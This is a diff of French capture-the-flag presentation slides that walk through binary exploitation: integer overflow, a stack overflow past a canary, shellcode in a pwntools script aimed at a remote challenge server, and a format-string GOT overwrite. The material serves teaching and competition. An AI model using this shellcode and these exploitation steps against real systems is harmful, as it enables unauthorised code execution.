@@ -272,7 +272,7 @@
             * Pas plus de résultats
             * Retour dans le binaire
             ``` nasm
-            cmp     eax, 3548828169
+            cmp     eax, 0x0D386D209
             ```
             * Comparaison sur 32-bits 
             * Integer overflow !
@@ -329,20 +329,17 @@
             <script type="text/template">
             ## Recherche de la faille
 
-            ```
+            ``` bash
             $ python -c "print 'A'*10000" | ./precision
             Buff: 0xffe51a28
             Segmentation fault (core dumped)
+            $ strace -i ./precision < input_de_fou
+            [f7640b47] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xff968000} ---
             ```
 
             * SEGFAULT ! Devrait pas être trop difficile...
             * Finalement, il y a un "canary" sur la stack
             ``` nasm
-            fld    QWORD PTR [esp+0x98]
-            fld    QWORD PTR ds:0x8048690
-            fucomip st,st(1)
-            fstp   st(0)
-            jp     0x80485a9 <main+140>
             fld    QWORD PTR [esp+0x98]
             fld    QWORD PTR ds:0x8048690
             fucomip st,st(1)
@@ -353,6 +350,14 @@
             mov    DWORD PTR [esp],0x1
             call   0x80483e0 <exit@plt>
             ```
+            
+            ``` bash
+            $ strace -i ./precision <input
+            [41414141] --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
+            [????????????????] +++ killed by SIGSEGV (core dumped) +++
+            ```
+
+
             </script>
         </section>
 
@@ -389,7 +394,7 @@ from pwn import *
 
 CANARY = '\xA5\x31\x5a\x47\x55\x15\x50\x40'
 LEN_EXPLOIT = 128
-shellcode = "\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4"
+shellcode = '\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4'
 
 conn = remote('54.173.98.115', 1259)
 #conn = process('../precision')
@@ -502,7 +507,7 @@ conn.interactive()
             ## Global Offset Table (GOT)
     
             * Tableau de pointeurs vers des fonctions de bibliothèques externes
-            * Populé par le loader lors du premier appel de la fonction (lazy)
+            * Populé dynamiquement par le loader
 
             ```
             Relocation section '.rel.plt' at offset 0x43c contains 14 entries:
@@ -530,7 +535,6 @@ conn.interactive()
             ## Format string
     
             * "memset" est appelé avec notre input quand on efface un contact
-            * On peut seulement écrire 2 bytes à la fois dans l'adresse de memcpy
             * C'est bien beau, mais c'est quoi l'adresse de system ?
 
             </script>
@@ -555,14 +559,14 @@ conn.interactive()
 
             * Il nous faut 4 format string :
                 * écrire ptr_GOT
-                * écrire 2 bytes dans memcpy
+                * écrire 2 bytes dans memset
                 * écrire ptr_GOT + 2
-                * écrire 2 bytes dans memcpy
+                * écrire 2 bytes dans memset
 
 
             ``` bash
             #######################+-----------+
-             +-------------------> |   memcpy  |
+             +-------------------> |   memset  |
              |  +-----------+      +-----------+
              +- | ptr_GOT   |<-+
                 +-----------+  |
@@ -586,7 +590,7 @@ conn.interactive()
             <script type="text/template">
             ## FTP
             
-            * C'est le même programme, mais maintenant il faut uploader flag.txt
+            * C'est le même programme, mais maintenant il faut downloader flag.txt
             * Il faut outrepasser le filtre du "f" dans le path du fichier
 
             </script>
